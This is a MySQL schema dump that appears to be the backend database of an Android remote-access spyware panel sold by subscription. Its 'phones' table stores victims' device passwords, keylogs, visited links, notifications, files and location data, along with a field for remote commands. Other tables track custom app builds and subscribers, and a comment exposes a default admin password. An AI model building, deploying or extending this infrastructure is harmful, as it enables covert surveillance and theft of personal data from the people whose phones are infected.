CREATE DATABASE IF NOT EXISTS `clients` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE `clients`;
-- MySQL dump 10.13  Distrib 5.7.43, for Linux (x86_64)
--
-- Host: localhost    Database: clients
-- ------------------------------------------------------
-- Server version	5.7.43-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `admins`
--

DROP TABLE IF EXISTS `admins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `admins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admins`
--


--
-- Table structure for table `custom_app`
--

DROP TABLE IF EXISTS `custom_app`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_app` (
  `build_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `appname` varchar(18) NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL,
  PRIMARY KEY (`build_id`),
  UNIQUE KEY `cstmappuniq` (`app_package`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `custom_app_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=274 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_app`
--


--
-- Table structure for table `phones`
--

DROP TABLE IF EXISTS `phones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phones` (
  `phone_id` text NOT NULL,
  `usrname` varchar(50) NOT NULL,
  `phone_name` varchar(20) NOT NULL,
  `country` text NOT NULL,
  `address` text NOT NULL,
  `android_ver` text NOT NULL,
  `model` text NOT NULL,
  `phonepassword` text NOT NULL,
  `phonenumber` text NOT NULL,
  `wallpaper` longtext,
  `battery_charg` text NOT NULL,
  `network` text NOT NULL,
  `install_date` text NOT NULL,
  `last_ping` datetime NOT NULL,
  `files_path` text,
  `files_data` text,
  `mob_permissions` text,
  `keylogs_dates` text NOT NULL,
  `visited_links` text NOT NULL,
  `visited_apps` text NOT NULL,
  `notifications` text NOT NULL,
  `activities` text NOT NULL,
  `phone_options` text NOT NULL,
  `session_id` varchar(255) NOT NULL DEFAULT 'empty',
  `Commands` text,
  `isonline` tinyint(1) NOT NULL DEFAULT '0',
  `isRemoved` tinyint(1) NOT NULL DEFAULT '0',
  `phoneopen` tinyint(1) NOT NULL DEFAULT '1',
  `accessibility` varchar(10) DEFAULT '0',
  PRIMARY KEY (`phone_id`(255)),
  UNIQUE KEY `unique_phone_id` (`phone_id`(255)),
  UNIQUE KEY `phone_id` (`phone_id`(255))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phones`
--


--
-- Table structure for table `store`
--

DROP TABLE IF EXISTS `store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `store` (
  `app_id` varchar(255) NOT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `app_size` varchar(50) DEFAULT NULL,
  `app_date` varchar(50) DEFAULT NULL,
  `app_folder` varchar(255) NOT NULL,
  `app_version` varchar(255) NOT NULL,
  `main_activity` varchar(155) NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`app_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `store`
--


--
-- Table structure for table `store_likes`
--

DROP TABLE IF EXISTS `store_likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `store_likes` (
  `like_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `app_id` varchar(255) NOT NULL,
  PRIMARY KEY (`like_id`),
  UNIQUE KEY `unique_user_app_like` (`user_id`,`app_id`),
  KEY `app_id` (`app_id`),
  CONSTRAINT `store_likes_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  CONSTRAINT `store_likes_ibfk_2` FOREIGN KEY (`app_id`) REFERENCES `store` (`app_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `store_likes`
--


--
-- Table structure for table `user_apps`
--

DROP TABLE IF EXISTS `user_apps`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user_apps` (
  `build_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL,
  PRIMARY KEY (`build_id`),
  UNIQUE KEY `usrappuniq` (`app_package`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `user_apps_fk_app_package` FOREIGN KEY (`app_package`) REFERENCES `store` (`app_id`),
  CONSTRAINT `user_apps_fk_user_id` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  CONSTRAINT `user_apps_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  CONSTRAINT `user_apps_ibfk_2` FOREIGN KEY (`app_package`) REFERENCES `store` (`app_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_apps`
--


--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `userid` int(11) NOT NULL AUTO_INCREMENT,
  `usrname` varchar(16) DEFAULT NULL,
  `profilepic` text NOT NULL,
  `email` tinytext NOT NULL,
  `password` text NOT NULL,
  `otp_salt` text,
  `Expire` date DEFAULT NULL,
  `subtype` enum('1 Month','3 Month','6 Month','9 Month','12 Month','new') DEFAULT NULL,
  `token` text,
  `token_expiration` datetime DEFAULT NULL,
  `authorty` enum('admin','news','clients') NOT NULL,
  `contact` varchar(255) DEFAULT NULL,
  `hidden` tinyint(1) DEFAULT '0',
  `admin_remark` text DEFAULT NULL,
  `admin_token` text DEFAULT NULL,
  `admin_token_expiration` datetime DEFAULT NULL,
  PRIMARY KEY (`userid`),
  UNIQUE KEY `userid` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=954471 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

-- Default admin account: username=admin  password=admin123
INSERT INTO `users` (`userid`, `usrname`, `profilepic`, `email`, `password`, `authorty`, `Expire`, `subtype`, `hidden`)
VALUES (1, 'admin', '', 'admin@localhost', '$2a$10$Zur9H7G/3MEKVfQdtWDRdu8roBzy4YnPzej79/GMZHmdp3BSLafJe', 'admin', NULL, NULL, 0);

--
-- Dumping events for database 'clients'
--

--
-- Dumping routines for database 'clients'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

--
-- Audit and log tables required by the Java backend
--

CREATE TABLE IF NOT EXISTS `login_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) DEFAULT NULL,
  `success` tinyint(1) NOT NULL DEFAULT '0',
  `ip` varchar(64) DEFAULT NULL,
  `user_agent` varchar(255) DEFAULT NULL,
  `reason` varchar(128) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `error_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `phone_id` varchar(255) DEFAULT NULL,
  `devicename` varchar(128) DEFAULT NULL,
  `ip` varchar(64) DEFAULT NULL,
  `log` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `admin_action_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `admin_username` varchar(50) DEFAULT NULL,
  `action` varchar(64) DEFAULT NULL,
  `target` varchar(255) DEFAULT NULL,
  `payload_json` text DEFAULT NULL,
  `ip` varchar(64) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Dump completed on 2026-03-20  3:28:27
